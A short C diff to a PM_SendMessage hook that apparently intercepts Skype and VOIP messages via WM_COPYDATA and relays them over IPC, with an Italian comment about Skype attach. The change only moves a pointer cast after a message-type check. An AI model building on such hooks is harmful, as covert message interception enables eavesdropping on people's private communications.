@@ -1285,8 +1285,6 @@ LRESULT __stdcall PM_SendMessage(  HWND hWnd,
 
 	if (!pData->pHM_IpcCliWrite) 
 		return ret_code;
-	cdata = (COPYDATASTRUCT *)lParam;
-	msg_body = (BYTE *)cdata->lpData;
 
 	// Skype ha dato l'ok per l'attach. Notifico i processi per poter mandare i messaggi delle api 
 	if (!pData->is_spm_installed && !pData->is_skypepm && Msg==pData->attach_msg && wParam!=NULL) {
@@ -1318,6 +1316,8 @@ LRESULT __stdcall PM_SendMessage(  HWND hWnd,
 	
 	if (Msg != WM_COPYDATA)
 		return ret_code;
+	cdata = (COPYDATASTRUCT *)lParam;
+	msg_body = (BYTE *)cdata->lpData;
 
 	if (pData->is_skypepm) {
 		if ((*Active_VOIP)) {
